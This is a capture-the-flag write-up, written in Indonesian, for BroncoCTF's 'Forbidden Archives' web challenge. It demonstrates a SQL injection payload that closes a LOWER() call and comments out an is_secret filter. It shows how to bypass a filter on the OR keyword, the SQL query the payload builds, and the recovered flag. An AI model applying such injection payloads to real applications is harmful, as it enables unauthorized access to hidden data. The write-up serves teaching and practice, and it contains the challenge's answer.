---
title: "Forbidden Archives"
ctf: "BroncoCTF"
date: 2026-07-12
category: web
difficulty: unknown
points: 0
flag_format: "bronco{...}"
author: "rhnataiet23-art"
---

# Forbidden Archives

Pencarian buku dibangun dengan string SQL dan hanya menampilkan baris dengan `is_secret = 0`. Input dimasukkan ke dalam `LOWER('%<search>%')`, sehingga penutup quote dan kurung dapat mengubah predicate lalu mengomentari filter rahasia.

## Recon

`search=%` menampilkan buku publik. Input satu quote memunculkan error SQLite berikut:

```text
unrecognized token: "') AND is_secret = 0 LIMIT 1"
```

Fragmen tersebut menunjukkan bentuk query efektifnya:

```sql
... WHERE LOWER(title) LIKE LOWER('%<search>%') AND is_secret = 0 LIMIT 1
```

Keyword `OR` difilter, jadi bypass memakai predicate tanpa `OR`. Payload menutup `LOWER()`, menambahkan pencarian judul target, lalu mengomentari sisa query:

```sql
') AND lower(title) LIKE lower('%All%Knowledge%') -- -
```

Query yang terbentuk:

```sql
... WHERE LOWER(title) LIKE LOWER('%')
    AND lower(title) LIKE lower('%All%Knowledge%') -- -%')
    AND is_secret = 0 LIMIT 1
```

Filter `is_secret = 0` tidak lagi dieksekusi dan buku target dikembalikan.

## Solver

```bash
source /home/nata/ctf_env/bin/activate
python3 solve.py
```

Output:

```text
bronco{y0u_d3f3@t3d_th3_h1gh_c0unc1l}
```

## Flag

```text
bronco{y0u_d3f3@t3d_th3_h1gh_c0unc1l}
```
